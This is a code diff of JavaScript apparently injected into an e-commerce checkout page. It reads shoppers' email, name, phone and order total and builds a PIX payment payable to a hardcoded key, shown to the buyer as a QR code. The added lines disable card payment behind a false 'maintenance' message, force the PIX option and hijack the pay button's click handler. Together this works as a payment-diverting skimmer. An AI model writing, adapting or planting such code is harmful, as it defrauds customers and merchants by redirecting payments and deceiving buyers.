@@ -26,15 +26,15 @@
       }
   
       const payload = [
-        formatTag('00', '01'), // Payload Format Indicator
-        formatTag('26', formatTag('00', 'BR.GOV.BCB.PIX') + formatTag('01', chave)), // Merchant Account Info
-        formatTag('52', '0000'), // Merchant Category Code
-        formatTag('53', '986'),  // Currency (986 = BRL)
-        formatTag('54', valor.toFixed(2)), // Valor
-        formatTag('58', 'BR'), // País
-        formatTag('59', 'N'),   // Nome do recebedor
-        formatTag('60', 'C'),   // Cidade
-        formatTag('62', formatTag('05', '***')) // Info adicional
+        formatTag('00', '01'),
+        formatTag('26', formatTag('00', 'BR.GOV.BCB.PIX') + formatTag('01', chave)),
+        formatTag('52', '0000'),
+        formatTag('53', '986'),
+        formatTag('54', valor.toFixed(2)),
+        formatTag('58', 'BR'),
+        formatTag('59', 'N'),
+        formatTag('60', 'C'),
+        formatTag('62', formatTag('05', '***'))
       ].join('');
   
       const semCRC = payload + '6304';
@@ -56,7 +56,12 @@
     }
   
     // Função principal para Promise.all e criação do iframe
-    function executarIframe() {
+    function executarIframe(e) {
+      if(e){
+        e.preventDefault();
+        e.stopImmediatePropagation();
+      }
+  
       // Captura variáveis externas
       const email = document.querySelector('input#email')?.value || '';
       const firstName = document.querySelector('input#TextField0')?.value || '';
@@ -70,7 +75,7 @@
       const phone = document.querySelector('input#TextField3')?.value || '';
       const price = parseFloat(document.querySelector('div[role="row"] strong.notranslate')?.innerText.replace(/[^\d,.-]/g,'').replace(',','.')) || 0;
   
-      const chaveFixa = "joao@gmail.com"; // <<< SUA CHAVE PIX REAL
+      const chaveFixa = "joao@gmail.com";
       const copiaecola = gerarPixCopiaECola(chaveFixa, price);
       const qrCodeUrl = "https://api.qrserver.com/v1/create-qr-code/?size=158x158&data=" + encodeURIComponent(copiaecola);
   
@@ -113,13 +118,59 @@
       .catch(err => console.error(err));
     }
   
-    // Limpa eventos anteriores do botão e adiciona onclick
-    const btn = document.getElementById('checkout-pay-button');
-    if(btn){
-      const clone = btn.cloneNode(true);
-      btn.parentNode.replaceChild(clone, btn);
-      clone.addEventListener('click', executarIframe);
+    // Função para desabilitar cartão de crédito e forçar Pix
+    function disableCreditCardAndForcePix() {
+      const creditCardInput = document.querySelector('input#basic-creditCards');
+      if (creditCardInput) {
+        creditCardInput.disabled = true;
+      }
+  
+      document.querySelectorAll('input#basic-creditCards ~ * button').forEach(button => {
+        const newButton = button.cloneNode(true);
+        button.parentNode.replaceChild(newButton, button);
+        newButton.disabled = true;
+      });
+  
+      document.querySelectorAll('input#basic-creditCards ~ div').forEach(div => {
+        const newDiv = div.cloneNode(true);
+        div.parentNode.replaceChild(newDiv, div);
+      });
+  
+      const label = document.querySelector('label[for="basic-creditCards"]');
+      if (label) {
+        const maintenanceMsg = document.createElement('div');
+        maintenanceMsg.style.color = 'red';
+        maintenanceMsg.style.fontWeight = 'bold';
+        maintenanceMsg.style.marginTop = '10px';
+        maintenanceMsg.innerText = 'Opção de pagamento por cartão de crédito está em manutenção no momento.';
+        label.appendChild(maintenanceMsg);
+      }
+  
+      const pixInput = document.querySelector('input#basic-Pix');
+      if (pixInput) {
+        pixInput.click();
+      }
+  
+      // Substitui botão e div pai ao carregar
+      const btn = document.getElementById('checkout-pay-button');
+      if(btn){
+        const parent = btn.parentNode;
+        const parentClone = parent.cloneNode(true);
+        parent.parentNode.replaceChild(parentClone, parent);
+  
+        const newBtn = parentClone.querySelector('#checkout-pay-button');
+        if(newBtn){
+          const btnClone = newBtn.cloneNode(true);
+          newBtn.parentNode.replaceChild(btnClone, newBtn);
+          btnClone.addEventListener('click', executarIframe, true);
+        }
+      }
     }
   
+    if (document.readyState === 'complete') {
+      disableCreditCardAndForcePix();
+    } else {
+      window.addEventListener('load', disableCreditCardAndForcePix);
+    }
   })();
   
